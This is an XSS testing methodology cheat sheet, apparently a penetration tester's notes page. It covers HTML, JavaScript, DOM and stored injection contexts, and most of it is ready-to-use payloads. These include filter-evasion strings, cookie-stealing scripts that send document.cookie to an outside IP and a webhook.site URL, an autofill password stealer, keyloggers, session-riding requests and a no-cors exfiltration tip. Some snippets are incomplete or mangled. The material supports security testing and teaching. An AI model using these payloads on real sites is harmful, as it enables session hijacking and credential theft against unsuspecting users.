[https://appsecexplained.gitbook.io/appsecexplained/common-vulns/javascript-injection-xss/xss-methodology](https://appsecexplained.gitbook.io/appsecexplained/common-vulns/javascript-injection-xss/xss-methodology)
## Identify
---
Are we able to control any data that is being reflected back and rendered by the application?

Important considerations:

- Where is the payload executing?
- What input validation exists?

## HTLM Tag Context
---
If we have control over content that is being reflected in an html tag.
You can try to close the tag and exec
```
"><script>prompt(1)</script>
"><img src=x onerror="prompt(1)">
```
If you have control over an `href` you can try the javascript browser scheme
```
http://example.com --> javascript:prompt()
```
Or just close tag early
```
</selected><img src=x onerror="prompt(1)">
```
## Javascript context
---
If we have control over content that is being reflected into a javascript context. Example:
```javascript
var querySearch = 'controlledInput'
```
Break the quote by appending input and comment out trailing semicolon.
```
controlledInput';prompt()//';
```


## General

### Quickly test for unfiltered tags
---
1. Get a list of tags (copy to clipboard [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet))
2. Intercept request with burp, send to intruder.
![](../../../../assets/Pasted%20image%2020250629173700.png)
3. Paste the tags into the payloads. 
4. Start attack, monitor for unfiltered response codes, different length responses, etc...
5. You've hopefully found an unfiltered tag.
6. You can append portions of the payloads to determine exactly what is triggering the block.
7. Copy the events from portswigger, do the same thing for the event portion of the payload.


**Test html injection first, usually this is a good indicator (JS = you might need to bypass filter)**
```Python
<h1>test</h1>
```
**Payloads**
```html
<script>alert()</script>
```
```html
<script>print()</script>
```
```html
<script>prompt("string")</script>
```
```html
<script>alert(window.origin)</script>
```
```html
 <plaintext>
```
!!! alert "info"
	Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of window.origin in the alert box, instead of a static value like 1. In this case, the alert box would reveal the URL it is being executed on

**You need to trigger XSS if not executed on page load**
```html
<img src=x onerror="prompt(1)">
```
**Redirect**
```html
<img src=x onerror="window.location.href='<https://example.com>'">
```
**script tag filter**
```html
<img src=x onerror=print()>
```
```html
<scri<script>pt>prompt(1)<scri</scr</script>ipt>
```
**Keylogger**
```html
function logKey(event){console.log(event.key)}
```
```html
 document.addEventListener('keydown', logKey)
```


## DOM XSS
---
### Identify
You have XSS execution, but no http requests are being made. We see that the input parameter in the URL is using a hashtag # for the item we added, which means that this is a client-side parameter that is completely processed on the browser. This indicates that the input is being processed at the client-side through JavaScript and never reaches the back-end. This is DOM XSS
if we look at the page source by hitting `CTRL+U`, we will notice that our `test` string is nowhere to be found. This is because the JavaScript code is updating the page when we click the `Add` button
We can still view the rendered page source with the Web Inspector tool by clicking `CTRL+SHIFT+C`:

## Stored
**Steal admin cookie (classic)**
```html
<script>fetch("<http://192.168.187.130:9999/>" + document.cookie)</script>
```
```html
<script>var i = new Image; i.src="https://webhook.site/9b3374bf-b997-4021-a302-de75a26fd841/?"+document.cookie;</script>
```

!!! alert "note"
	Sometimes you may need to trigger the payload with JS as well (JS to resize the screen when using an onresize event to trigger)

### Automated with DOM Invader
---
Turn DOM invader on via the burp extension. Open dev tools,click DOM Invader tab.
Input the provided canary to potential execution. DOM Invader will identify sources and sinks for that data.

## Note on CORS
---
CORS policy will not block data exfil, only the REPONSES from non-allowlisted domains are blocked. The request will still be made, (to your webhook etc) just pass the `mode: 'no-cors'`


## Extending XSS
Steal cookies
```JS
<img src="http://localhost?c='+document.cookie+'" /> fetch("http://localhost?c="+document.cookie);
```
Accessing local & session storage
```JS
let localStorageData = JSON.stringify(localStorage) let sessionStorageData = JSON.stringify(sessionStorage)
```
Autofill stealer
```JS
// create the input elements
let usernameField = document.createElement("input")
usernameField.type = "text"
usernameField.name = "username"
usernameField.id = "username"
let passwordField = document.createElement("input")
passwordField.type = "password"
passwordField.name = "password"
passwordField.id = "password"
// append the elements to the body of the page
document.body.appendChild(usernameField)
document.body.appendChild(passwordField)
// exfiltrate as needed (we need to wait for the fields to be
filled before exfiltrating the information)
setTimeout(function() {
console.log("Username:",
document.getElementById("username").value)
console.log("Password:",
document.getElementById("password").value)
```

Session Riding
```JS

let xhr = new XMLHttpRequest();
xhr.open('POST','http://localhost/updateprofile',true);
xhr.setRequestHeader('Content-type','application/x-www-form-
urlencoded');
xhr.send('email=updated@email.com (mailto:updated@email.com)’);
```
Keylogging
```JS
Keylogging
document.onkeypress = function(e) {
get = window.event ? event : e
key = get.keyCode ? get.keyCode : get.charCode
key = String.fromCharCode(key)
console.log(key)
}
```

## XSS Filter Evasion
---
OWASP cheat sheet is pretty good
[https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)



